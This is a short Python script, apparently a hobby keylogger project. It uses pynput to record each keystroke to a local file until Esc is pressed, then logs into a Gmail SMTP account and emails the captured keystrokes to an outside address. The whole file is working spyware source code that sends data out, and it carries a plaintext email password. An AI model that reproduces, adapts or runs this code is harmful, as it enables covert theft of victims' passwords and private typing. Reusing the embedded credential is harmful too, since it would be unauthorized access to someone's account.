import pynput
from pynput.keyboard import *

import smtplib
import time

f = open("sample.txt",'a')
def pressed(key):
    print(key)
    f.write(str(key))

def released(key):
    if key==Key.esc:
        return False

with Listener(on_press=pressed, on_release=released) as l:
    l.join()

f.close()

mail = smtplib.SMTP("smtp.gmail.com",587)

mail.starttls()

mail.login("keyloggerprojectpython@gmail.com","wdzua76sAU9BkSs")

f = open("sample.txt",'r')

message = f.read()
f.close()

mail.sendmail("keyloggerprojectpython@gmail.com","miyob78337@wawue.com",message)

mail.quit()
